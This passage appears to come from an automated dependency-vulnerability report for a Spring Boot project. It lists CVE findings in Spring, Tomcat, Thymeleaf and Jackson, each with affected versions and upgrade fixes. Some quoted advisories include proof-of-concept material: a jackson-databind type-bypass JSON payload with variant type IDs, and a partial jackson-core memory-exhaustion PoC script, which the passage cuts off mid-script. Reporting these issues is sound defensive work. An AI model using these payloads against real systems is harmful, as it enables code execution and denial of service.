- `AbstractMappingContext.getPersistentPropertyPath(String, Class<?>)` (line 345) and `(String, TypeInformation<?>)` (line 350) → `persistentPropertyPathFactory.from(type, propertyPath)` → straight into the unbounded cache. No validation, no `PropertyPath.from` gate.
- This is the public `MappingContext` interface (`MappingContext.java:174,186`), documented to throw `InvalidPersistentPropertyPath` on bad input — i.e., the contract explicitly anticipates being called with possibly-invalid strings.
- No in-repo caller routes HTTP input directly into the `String` overload. The `Sort.Order.property` → `getPersistentPropertyPath(String, ...)` bridge lives in store modules (Spring Data MongoDB `QueryMapper`, Spring Data REST sort translator). That wiring is out-of-repo as the finding states.

**Protections — NONE on this cache**
Contrast: `SimplePropertyPath.java:52` (the `PropertyPath.from` cache) uses `ConcurrentReferenceHashMap` (soft refs, GC-evictable). Spring already hardened the sibling cache against exactly this pattern. `PersistentPropertyPathFactory.propertyPaths` was not given the same treatment.

**Stress-test**
Is this exclusion #3 (intended design)? The `PathResolution` javadoc (line 426-430) says caching unresolved paths is deliberate — to make repeated lookups of the *same* bad path cheap. But unbounded hard-ref caching of *arbitrary attacker-chosen* keys is not the intent; the sibling fix proves Spring considers this a bug class.

Recommended fix:
- org.springframework.data:spring-data-commons: upgrade to 3.5.12 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-41716: Spring Data Commons: Heap exhaustion from unbounded property-lookup cache retaining crafted string keys
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:46

[CVE-2026-41716](https://github.com/advisories/GHSA-9fw2-h3hf-293r): Spring Data Commons: Heap exhaustion from unbounded property-lookup cache retaining crafted string keys

Severity: HIGH

Affected resolved dependencies:
- org.springframework.data:spring-data-commons:3.5.0 (transitive via org.springframework.boot:spring-boot-starter-data-jpa; compile scope; pom.xml:46); affected range: >= 3.5.0, <= 3.5.11

Advisory description / exploitation conditions:
Spring Data's internal property-lookup cache accepts and permanently retains attacker-supplied strings as cache keys, allowing heap exhaustion through repeated requests.

Affected versions:
Spring Data Commons 2.7.0 through 2.7.19; 3.3.0 through 3.3.16; 3.4.0 through 3.4.14; 3.5.0 through 3.5.11; 4.0.0 through 4.0.5.

Recommended fix:
- org.springframework.data:spring-data-commons: upgrade to 3.5.12 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-41842: Spring Framework Denial of Service via Versioned Resources in Spring MVC and WebFlux
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-41842](https://github.com/advisories/GHSA-x23c-287f-qqv5): Spring Framework Denial of Service via Versioned Resources in Spring MVC and WebFlux

Severity: HIGH

Affected resolved dependencies:
- org.springframework:spring-webmvc:6.2.7 (transitive via org.springframework.boot:spring-boot-starter-web; compile scope; pom.xml:34); affected range: >= 6.2.0, <= 6.2.18

Advisory description / exploitation conditions:
Spring MVC and WebFlux applications are vulnerable to Denial of Service (DoS) attacks when resolving static resources.

Affected versions:
Spring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.

Recommended fix:
- org.springframework:spring-webmvc: upgrade to 6.2.19 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-41845: Spring Framework Cross-site Scripting via JavaScriptUtils
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-41845](https://github.com/advisories/GHSA-3chg-m5w7-qfv5): Spring Framework Cross-site Scripting via JavaScriptUtils

Severity: HIGH

Affected resolved dependencies:
- org.springframework:spring-webmvc:6.2.7 (transitive via org.springframework.boot:spring-boot-starter-web; compile scope; pom.xml:34); affected range: >= 6.2.0, <= 6.2.18

Advisory description / exploitation conditions:
Due to incorrect escaping, the use of JavaScriptUtils.javaScriptEscape() may lead to JavaScript code injection in the browser, potentially resulting in a cross-site scripting (XSS) vulnerability.

Affected versions:
Spring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.

Recommended fix:
- org.springframework:spring-webmvc: upgrade to 6.2.19 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-41850: Spring Framework Algorithmic Denial of Service via SpEL Expressions
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-41850](https://github.com/advisories/GHSA-r5w3-xv2f-j59q): Spring Framework Algorithmic Denial of Service via SpEL Expressions

Severity: HIGH

Affected resolved dependencies:
- org.springframework:spring-expression:6.2.7 (transitive via org.springframework.boot:spring-boot-starter-web; compile scope; pom.xml:34); affected range: >= 6.2.0, <= 6.2.18

Advisory description / exploitation conditions:
Applications that evaluate user-supplied Spring Expression Language (SpEL) expressions are vulnerable to an Algorithmic Denial of Service (DoS). By providing a specially crafted expression, an attacker can trigger excessive resource consumption during evaluation, leading to application degradation or unavailability.

Affected versions:
Spring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.

Recommended fix:
- org.springframework:spring-expression: upgrade to 6.2.19 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-41901: Sandboxed Thymeleaf expressions vulnerable to improper recognition of unauthorized syntax patterns
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:40

[CVE-2026-41901](https://github.com/advisories/GHSA-c9ph-gxww-7744): Sandboxed Thymeleaf expressions vulnerable to improper recognition of unauthorized syntax patterns

Severity: CRITICAL

Affected resolved dependencies:
- org.thymeleaf:thymeleaf:3.1.3.RELEASE (transitive via org.springframework.boot:spring-boot-starter-thymeleaf; compile scope; pom.xml:40); affected range: <= 3.1.4.RELEASE
- org.thymeleaf:thymeleaf-spring6:3.1.3.RELEASE (transitive via org.springframework.boot:spring-boot-starter-thymeleaf; compile scope; pom.xml:40); affected range: <= 3.1.4.RELEASE

Advisory description / exploitation conditions:
### Impact

A security bypass vulnerability exists in the expression execution mechanisms of Thymeleaf up to and including 3.1.4.RELEASE. Although the library provides mechanisms to avoid the execution of potentially dangerous expressions in some specific sandboxed (restricted) contexts, it fails to properly neutralize specific constructs that allow this kind of expressions to be executed. If an application developer passes to the template engine unsanitized variables that contain such expressions, and these values are used in sandboxed contexts inside the templates, these expressions can be executed achieving Server-Side Template Injection (SSTI).

### Patches

This has been fixed in Thymeleaf 3.1.5.RELEASE. All users are advised to upgrade immediately.

### Workarounds

No workaround is available beyond ensuring applications do not pass unvalidated/unsanitized data directly to the template engine. Upgrading to 3.1.5.RELEASE is strongly recommended in any case.

Recommended fix:
- org.thymeleaf:thymeleaf-spring6: upgrade to 3.1.5.RELEASE or a later supported patched release
- org.thymeleaf:thymeleaf: upgrade to 3.1.5.RELEASE or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-42498: Apache Tomcat - WebSocket authentication header exposure
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-42498](https://github.com/advisories/GHSA-fv25-8xcx-gqjc): Apache Tomcat - WebSocket authentication header exposure

Severity: HIGH

Affected resolved dependencies:
- org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (transitive via org.springframework.boot:spring-boot-starter-web; compile scope; pom.xml:34); affected range: >= 10.1.0-M1, < 10.1.55

Advisory description / exploitation conditions:
Versions Affected:
Apache Tomcat 11.0.0-M1 to 11.0.21
Apache Tomcat 10.1.0-M1 to 10.1.54
Apache Tomcat 9.0.2 to 9.0.117
Older, unsupported versions may also be affected

Description:
If a WebSocket request was redirected after authentication, Tomcat's
WebSocket client would present the most recent authentication header to
the redirect target host.

Mitigation:
Users of the affected versions should apply one of the following
mitigations:
- Upgrade to Apache Tomcat 11.0.22 or later
- Upgrade to Apache Tomcat 10.1.55 or later
- Upgrade to Apache Tomcat 9.0.118 or later

Credit:
This issue was identified by lokerxx

Recommended fix:
- org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.55 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-43512: Apache Tomcat - Digest authenticator will authenticate any unknown user
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-43512](https://github.com/advisories/GHSA-h6fc-48rj-7qqh): Apache Tomcat - Digest authenticator will authenticate any unknown user

Severity: CRITICAL

Affected resolved dependencies:
- org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (transitive via org.springframework.boot:spring-boot-starter-web; compile scope; pom.xml:34); affected range: >= 10.1.0-M1, < 10.1.55

Advisory description / exploitation conditions:
Versions Affected:
Apache Tomcat 11.0.0-M1 to 11.0.21
Apache Tomcat 10.1.0-M1 to 10.1.54
Apache Tomcat 9.0.0.M1 to 9.0.117
Older, unsupported versions may also be affected

Description:
When DIGEST authentication was configured, any user not known to the
configured Realm would be authenticated if they presented the password
"null".

Mitigation:
Users of the affected versions should apply one of the following
mitigations:
- Upgrade to Apache Tomcat 11.0.22 or later
- Upgrade to Apache Tomcat 10.1.55 or later
- Upgrade to Apache Tomcat 9.0.118 or later

Recommended fix:
- org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.55 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-43513: Apache Tomcat: LockOutRealm treats user names as case-sensitive
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-43513](https://github.com/advisories/GHSA-5mp6-jrq3-r938): Apache Tomcat: LockOutRealm treats user names as case-sensitive

Severity: HIGH

Affected resolved dependencies:
- org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (transitive via org.springframework.boot:spring-boot-starter-web; compile scope; pom.xml:34); affected range: >= 10.1.0-M1, < 10.1.55

Advisory description / exploitation conditions:
Improper Handling of Case Sensitivity vulnerability in LockOutRealm in Apache Tomcat.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.21, from 10.1.0-M1 through 10.1.54, from 9.0.0.M1 through 9.0.117, from 8.5.0 through 8.5.100, from 7.0.0 through 7.0.109.
Older unsupported versions may also be affected.

Users are recommended to upgrade to version 11.0.22, 10.1.55 or 9.0.118 which fix the issue.

Recommended fix:
- org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.55 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-43515: Apache Tomcat - Security constraints not correctly applied
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-43515](https://github.com/advisories/GHSA-5m62-pw8w-7w9f): Apache Tomcat - Security constraints not correctly applied

Severity: CRITICAL

Affected resolved dependencies:
- org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (transitive via org.springframework.boot:spring-boot-starter-web; compile scope; pom.xml:34); affected range: >= 10.1.0-M1, < 10.1.55

Advisory description / exploitation conditions:
Versions Affected:
Apache Tomcat 11.0.0-M1 to 11.0.21
Apache Tomcat 10.1.0-M1 to 10.1.54
Apache Tomcat 9.0.0.M1 to 9.0.117
Older, unsupported versions may also be affected

Description:
When multiple security constraints defined an HTTP method constraint for
the same extension pattern, only the first method constraint was applied.

Mitigation:
Users of the affected versions should apply one of the following
mitigations:
- Upgrade to Apache Tomcat 11.0.22 or later
- Upgrade to Apache Tomcat 10.1.55 or later
- Upgrade to Apache Tomcat 9.0.118 or later

Recommended fix:
- org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.55 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-47884: Spring Framework Improper Path Limitation in XsltView
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-47884](https://github.com/advisories/GHSA-pc63-qcmh-9cmg): Spring Framework Improper Path Limitation in XsltView

Severity: CRITICAL

Affected resolved dependencies:
- org.springframework:spring-webmvc:6.2.7 (transitive via org.springframework.boot:spring-boot-starter-web; compile scope; pom.xml:34); affected range: >= 6.2.0, <= 6.2.19

Advisory description / exploitation conditions:
Use of XsltView in a Spring MVC application can result in SSRF and RCE attack if the application has an "/**" mapping that results in view rendering, and where the view name is not explicitly specified.
Spring Framework 7.0.0 - 7.0.8
Spring Framework 6.2.0 - 6.2.19
Spring Framework 6.1.0 - 6.1.28
Spring Framework 6.0.0 - 6.0.30
Spring Framework 5.3.0 - 5.3.49
Spring Framework 5.2.25.RELEASE and earlier

Recommended fix:
- org.springframework:spring-webmvc: no patched version supplied by advisory; consult vendor mitigation

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-47890: Spring Framework Server Sent Event stream corruption while rendering fragments
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-47890](https://github.com/advisories/GHSA-j9f9-w8pj-32f8): Spring Framework Server Sent Event stream corruption while rendering fragments

Severity: CRITICAL

Affected resolved dependencies:
- org.springframework:spring-webmvc:6.2.7 (transitive via org.springframework.boot:spring-boot-starter-web; compile scope; pom.xml:34); affected range: >= 6.2.0, <= 6.2.19

Advisory description / exploitation conditions:
Spring MVC and WebFlux applications are vulnerable to stream corruption when using Server-Sent Events (SSE) with view fragments.
Spring Framework 7.0.0 - 7.0.8
Spring Framework 6.2.0 - 6.2.19

Recommended fix:
- org.springframework:spring-webmvc: no patched version supplied by advisory; consult vendor mitigation

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-54512: jackson-databind has a PolymorphicTypeValidator bypass via generic type parameters that allows arbitrary class instantiation
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:78

[CVE-2026-54512](https://github.com/advisories/GHSA-j3rv-43j4-c7qm): jackson-databind has a PolymorphicTypeValidator bypass via generic type parameters that allows arbitrary class instantiation

Severity: HIGH

Affected resolved dependencies:
- com.fasterxml.jackson.core:jackson-databind:2.19.0 (transitive via org.springframework.boot:spring-boot-starter-json; compile scope; pom.xml:78); affected range: >= 2.19.0, <= 2.21.3

Advisory description / exploitation conditions:
`jackson-databind`'s `PolymorphicTypeValidator` (PTV) is the primary safety mechanism guarding polymorphic deserialization. When polymorphic typing is enabled and a type identifier contains generic parameters (i.e. the type ID string contains `<`), `DatabindContext._resolveAndValidateGeneric()` validates **only the raw container class name** (the substring before `<`) against the configured PTV.

If the container type is approved, the method parses the full canonical type string via `TypeFactory.constructFromCanonical()` and returns the fully parameterized type **without ever validating the nested type arguments** against the PTV. The nested type arguments are then resolved, instantiated, and populated as beans during deserialization.

An attacker who controls the type ID can therefore place a denied class as a generic type parameter of an allowed container — for example `java.util.ArrayList<com.evil.Gadget>` when only `java.util.ArrayList` is allow-listed. The container passes the PTV check; `com.evil.Gadget` is loaded via `Class.forName(name, true, loader)`, instantiated, and its properties are set from attacker-controlled JSON. This completely bypasses an explicitly configured PTV allow-list.

This is the same vulnerability class responsible for the historical sequence of jackson-databind deserialization CVEs; here it manifests as a validator bypass rather than a missing deny-list entry.


## Impact

- **Bypass of the PTV allow-list**, including the recommended `BasicPolymorphicTypeValidator` configured with name-prefix allow rules.
- **Arbitrary class instantiation** of any type assignable to the container's element/parameter position, with attacker-controlled property values (setter/field injection).
- **Potential unauthenticated remote code execution** when a class with exploitable side effects (JNDI lookup, JDBC/connection-pool gadgets,`TemplatesImpl`-style loaders, etc.) is present on the classpath.

Applications that accept untrusted JSON and rely on a configured PTV — the documented, security-conscious configuration — are affected.


## Proof of Concept

Configuration restricting polymorphic deserialization to a single safe container:

```java
BasicPolymorphicTypeValidator ptv = BasicPolymorphicTypeValidator.builder()
        .allowIfSubType("java.util.ArrayList")
        .build();

ObjectMapper mapper = JsonMapper.builder()
        .polymorphicTypeValidator(ptv)
        .build();
```

Malicious payload (`Wrapper.value` is `Object` with `@JsonTypeInfo(use = Id.CLASS, include = As.WRAPPER_ARRAY)`):

```json
{"value":["java.util.ArrayList<com.evil.EvilGadget>",[{"cmd":"calc.exe"}]]}
```

On vulnerable versions, `com.evil.EvilGadget` is instantiated and its `cmd` property is set, despite only `java.util.ArrayList` being allow-listed. On `2.18.8` / `2.21.4` / `3.1.4` the deserialization throws `InvalidTypeIdException` before instantiation.

**Variant payloads** (all bypass an `ArrayList`/`HashMap` allow-list):

| Type ID | Smuggled type position |
|---|---|
| `java.util.ArrayList<Evil>` | list element |
| `java.util.HashMap<Evil,String>` | map key |
| `java.util.HashMap<String,Evil>` | map value |
| `java.util.ArrayList<java.util.ArrayList<Evil>>` | nested element |
| `java.util.ArrayList<Evil[]>` | array element |

---

## Patches

Fixed in **2.18.8**, **2.21.4** and **3.1.4** via the changes for [FasterXML/jackson-databind#5988](https://github.com/FasterXML/jackson-databind/issues/5988), commit `434d6c511`. The fix adds recursive validation of each non-trivial type parameter (and array element types appearing as parameters) through the full PTV chain, with documented exemptions for `Object` (wildcard resolution) and `Enum` types.

`PolymorphicTypeValidator` was added in 2.10.0 so vulnerability N/A for versions prior to that.

Recommended fix:
- com.fasterxml.jackson.core:jackson-databind: upgrade to 2.21.4 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-54513: jackson-databind has an array subtype allowlist bypass in BasicPolymorphicTypeValidator (allowIfSubTypeIsArray)
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:78

[CVE-2026-54513](https://github.com/advisories/GHSA-rmj7-2vxq-3g9f): jackson-databind has an array subtype allowlist bypass in BasicPolymorphicTypeValidator (allowIfSubTypeIsArray)

Severity: HIGH

Affected resolved dependencies:
- com.fasterxml.jackson.core:jackson-databind:2.19.0 (transitive via org.springframework.boot:spring-boot-starter-json; compile scope; pom.xml:78); affected range: >= 2.19.0, < 2.21.4

Advisory description / exploitation conditions:
## Summary
`BasicPolymorphicTypeValidator.Builder.allowIfSubTypeIsArray()` allowlists any array type based only on `clazz.isArray()`, without validating the array's component (element) type against the configured allowlist. A PTV built with `allowIfSubTypeIsArray()` plus an explicit concrete-type allowlist therefore still permits `EvilType[]` even though `EvilType` is not allowlisted. When Jackson deserializes the elements and no per-element type IDs are present, it instantiates the component type directly with no further PTV check, bypassing the allowlist.

## Impact
Applications using `BasicPolymorphicTypeValidator` with `allowIfSubTypeIsArray()` as a safeguard get no protection for concrete array component types; an attacker controlling JSON can instantiate non-allowlisted types via an array wrapper, re-opening the gadget-instantiation risk PTV is meant to prevent.

## Affected / Patched (verified via `git tag --contains`)
- 2.18 line: `>= 2.10.0, < 2.18.8` -> fixed in **2.18.8**
- 2.19-2.21 line: `>= 2.19.0, < 2.21.4` -> fixed in **2.21.4**
- 3.x line: `>= 3.0.0, < 3.1.4` -> fixed in **3.1.4**

`PolymorphicTypeValidator` was added in 2.10.0 so vulnerability N/A for versions prior to that.

## Severity / CWE
Maintainer: significant. Reporter: HIGH. CWE-184 (Incomplete List of Disallowed Inputs); related CWE-502.

## Upstream fix
FasterXML/jackson-databind#5981; fix PR #5983 (`24529da`), 2.18 backport PR #5984 (`01d1692`). Released 2026-06-04 in 2.18.8 / 2.21.4 / 3.1.4.

## Credits
Omkhar Arasaratnam (@omkhar) - finder.

Recommended fix:
- com.fasterxml.jackson.core:jackson-databind: upgrade to 2.21.4 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-65182: Apache Tomcat has an Improper Access Control, Incorrect Authorization vulnerability
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-65182](https://github.com/advisories/GHSA-gcx9-497g-6cp6): Apache Tomcat has an Improper Access Control, Incorrect Authorization vulnerability

Severity: CRITICAL

Affected resolved dependencies:
- org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (transitive via org.springframework.boot:spring-boot-starter-web; compile scope; pom.xml:34); affected range: >= 10.1.0-M1, < 10.1.58

Advisory description / exploitation conditions:
Improper Access Control, Incorrect Authorization vulnerability in Apache Tomcat leads to security constraint bypass if a constraint for a longer path is specified before a more restrictive constraint for a shorter sub-path.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.24, from 10.1.0-M1 through 10.1.57, from 9.0.0.M1 through 9.0.120, from 8.5.0 through 8.5.100, from 7.0.0 through 7.0.109.

Users are recommended to upgrade to version 11.0.25, 10.1.58, 9.0.121, which fixes the issue.

Recommended fix:
- org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.58 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-65905: Apache Tomcat's DIGEST authenticator has an Authentication Bypass by Capture-replay vulnerability
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:34

[CVE-2026-65905](https://github.com/advisories/GHSA-9xv2-5v5q-p794): Apache Tomcat's DIGEST authenticator has an Authentication Bypass by Capture-replay vulnerability

Severity: CRITICAL

Affected resolved dependencies:
- org.apache.tomcat.embed:tomcat-embed-core:10.1.41 (transitive via org.springframework.boot:spring-boot-starter-web; compile scope; pom.xml:34); affected range: >= 10.1.0-M1, < 10.1.58

Advisory description / exploitation conditions:
Authentication Bypass by Capture-replay vulnerability in Apache Tomcat's DIGEST authenticator. If, before windowSize requests have been made, a client makes a DIGEST authenticated request with a nonceCount on the upper boundary of the replay window then that request is replayable once only while the associated nonceCount remains within the replay window.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.24, from 10.1.0-M1 through 10.1.57, from 9.0.0.M1 through 9.0.120.

The following versions were EOL at the time the CVE was created but are known to be affected: from 8.5.0 through 8.5.100, from 7.0.30 through 7.0.109. Other unsupported versions may also be affected.

Users are recommended to upgrade to version 11.0.25, 10.1.58 or 9.0.121, which fix the issue.

Recommended fix:
- org.apache.tomcat.embed:tomcat-embed-core: upgrade to 10.1.58 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-68494: jackson-core: Async parser maxNumberLength bypass via chunked digit accumulation (incomplete fix for GHSA-72hv-8253-57qq)
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:78

[CVE-2026-68494](https://github.com/advisories/GHSA-r7wm-3cxj-wff9): jackson-core: Async parser maxNumberLength bypass via chunked digit accumulation (incomplete fix for GHSA-72hv-8253-57qq)

Severity: HIGH

Affected resolved dependencies:
- com.fasterxml.jackson.core:jackson-core:2.19.0 (transitive via org.springframework.boot:spring-boot-starter-json; compile scope; pom.xml:78); affected range: >= 2.19.0, < 2.21.4

Advisory description / exploitation conditions:
## Summary

The fix released in jackson-core `2.18.6` and `2.21.1` for [GHSA-72hv-8253-57qq](https://github.com/FasterXML/jackson-core/security/advisories/GHSA-72hv-8253-57qq) (Number Length Constraint Bypass in Async Parser, published 2026-02-28) is incomplete. The fix commit `b0c428e6` (#1555) wired `validateIntegerLength` into a new `_setIntLength` helper and called it at every place where the integer portion of a number is *decided* (terminator byte arrived, `.` / `e/E` seen, end-of-feed inside a fully-buffered value). It did not call it on the much more attacker-relevant path: "ran out of input while still inside `MINOR_NUMBER_INTEGER_DIGITS`, return `NOT_AVAILABLE` to caller".

As a result, an attacker who streams JSON to a non-blocking parser in many small chunks, without ever sending a terminator byte, can keep the parser inside `MINOR_NUMBER_INTEGER_DIGITS` indefinitely. `_textBuffer.expandCurrentSegment()` grows on every chunk, and `validateIntegerLength` is never invoked. The accumulator is only gated by `maxStringLength` (20 MiB default) — a **~20,000x amplification** of the documented `maxNumberLength` (1000 default).

This is the same vulnerability class, same advisory wording ("Memory Exhaustion: Unbounded allocation in TextBuffer from excessively long numbers"), same parser class — just the streaming path the original fix didn't cover. The fix to the *fraction* path is correct (see `_finishFloatFraction` at line 1834-1837 of `NonBlockingUtf8JsonParserBase.java` in 2.18.6, where `_setFractLength(fractLen)` IS called before the `NOT_AVAILABLE` return); the equivalent call is missing from every integer-digit path.

## Affected versions

Verified on the patched releases:
- `com.fasterxml.jackson.core:jackson-core` **2.18.6**
- `com.fasterxml.jackson.core:jackson-core` **2.21.1**

Structurally identical code in `tools.jackson.core` 3.0.x / 3.1.x — same `NonBlockingUtf8JsonParserBase` class, same `_setIntLength` rollout, same NOT_AVAILABLE returns without validation. Not retested but presumed vulnerable.

## Affected code

[`src/main/java/com/fasterxml/jackson/core/json/async/NonBlockingUtf8JsonParserBase.java`](https://github.com/FasterXML/jackson-core/blob/b0c428e6/src/main/java/com/fasterxml/jackson/core/json/async/NonBlockingUtf8JsonParserBase.java) in 2.18.6 / 2.21.1.

### Site 1 — `_startPositiveNumber(int ch)` lines 1320-1330:

```java
if (outPtr >= outBuf.length) {
    // NOTE: must expand to ensure contents all in a single buffer (to keep
    // other parts of parsing simpler)
    outBuf = _textBuffer.expandCurrentSegment();
}
outBuf[outPtr++] = (char) ch;
if (++_inputPtr >= _inputEnd) {
    _minorState = MINOR_NUMBER_INTEGER_DIGITS;
    _textBuffer.setCurrentLength(outPtr);
    return _updateTokenToNA();          // <-- no validateIntegerLength(outPtr)
}
```

### Site 2 — `_finishNumberIntegralPart` lines 1691-1727:

```java
protected JsonToken _finishNumberIntegralPart(char[] outBuf, int outPtr) throws IOException {
    int negMod = _numberNegative ? -1 : 0;

    while (true) {
        if (_inputPtr >= _inputEnd) {
            _minorState = MINOR_NUMBER_INTEGER_DIGITS;
            _textBuffer.setCurrentLength(outPtr);
            return _updateTokenToNA();    // <-- no validateIntegerLength(outPtr + negMod)
        }
        int ch = getByteFromBuffer(_inputPtr) & 0xFF;
        if (ch < INT_0) {
            if (ch == INT_PERIOD) {
                _setIntLength(outPtr+negMod);   // <-- validated here
                ++_inputPtr;
                return _startFloat(outBuf, outPtr, ch);
            }
            break;
        }
        if (ch > INT_9) {
            if ((ch | 0x20) == INT_e) {
                _setIntLength(outPtr+negMod);   // <-- validated here
                ++_inputPtr;
                return _startFloat(outBuf, outPtr, ch);
            }
            break;
        }
        ++_inputPtr;
        if (outPtr >= outBuf.length) {
            outBuf = _textBuffer.expandCurrentSegment();
        }
        outBuf[outPtr++] = (char) ch;
    }
    _setIntLength(outPtr+negMod);            // <-- validated here
    _textBuffer.setCurrentLength(outPtr);
    return _valueComplete(JsonToken.VALUE_NUMBER_INT);
}
```

The pattern recurs at lines 1297, 1329, 1343, 1365, 1395, 1409, 1437, 1467, 1481, 1586, 1644, 1698 — every "ran out of input mid-integer" exit returns to the caller without validating the accumulator length.

### Compare with the fraction path that is correct

`_finishFloatFraction` lines 1827-1838:

```java
while (loop) {
    if (ch >= INT_0 && ch <= INT_9) {
        ++fractLen;
        if (outPtr >= outBuf.length) {
            outBuf = _textBuffer.expandCurrentSegment();
        }
        outBuf[outPtr++] = (char) ch;
        if (_inputPtr >= _inputEnd) {
            _textBuffer.setCurrentLength(outPtr);
            _setFractLength(fractLen);          // <-- VALIDATED
            return JsonToken.NOT_AVAILABLE;
        }
        ch = getNextSignedByteFromBuffer();
    }
    ...
}
```

## Impact

Reactive frameworks (Spring WebFlux / Reactor, Quarkus, Helidon, Vert.x JSON, anything wrapping `JsonFactory.createNonBlockingByteArrayParser()` or `createNonBlockingByteBufferParser()`) feed inbound HTTP/gRPC bytes to the async parser as they arrive. Operators who set `StreamReadConstraints.builder().maxNumberLength(N)` on the assumption that this caps memory per number value are not getting that guarantee in chunked-feed scenarios. The parser silently accumulates digits up to `maxStringLength` (20 MiB default) per concurrent connection. Multiply by attacker-controlled concurrency to OOM the JVM.

The synchronous parsers (`UTF8StreamJsonParser`, `ReaderBasedJsonParser`) and the async parser on *complete* input are not affected — those paths go through `_setIntLength` or `ParserBase._reportTooLongIntegral` correctly.

CWE-770 (Allocation of Resources Without Limits or Throttling), CVSS roughly the same as the parent advisory (Network / Low complexity / High availability impact). The parent advisory was scored CVSS 8.7 High.

## Proof of concept

Standalone PoC, no Maven required:

```
mkdir poc && cd poc
curl -sLo jackson-core-2.18.6.jar https://repo1.maven.org/maven2/com/fasterxml/jackson/core/jackson-core/2.18.6/jackson-core-2.18.6.jar
cat > PoC.java <<'EOF'
import com.fasterxml.jackson.core.*;
import com.fasterxml.jackson.core.async.ByteArrayFeeder;

public class PoC {
    public static void main(String[] args) throws Exception {
        StreamReadConstraints strict = StreamReadConstraints.builder()
                .maxNumberLength(1000)
                .build();
        JsonFactory f = new JsonFactoryBuilder()
                .streamReadConstraints(strict)
                .build();

        // Sanity: synchronous parser rejects 5000-digit int.
        try (JsonParser p = f.createParser("{\"v\":" + "1".repeat(5000) + "}")) {
            while (p.nextToken() != null) { /* drive */ }
            System.out.println("[-] BUG ABSENT: sync parser accepted");
            return;
        } catch (Exception e) {
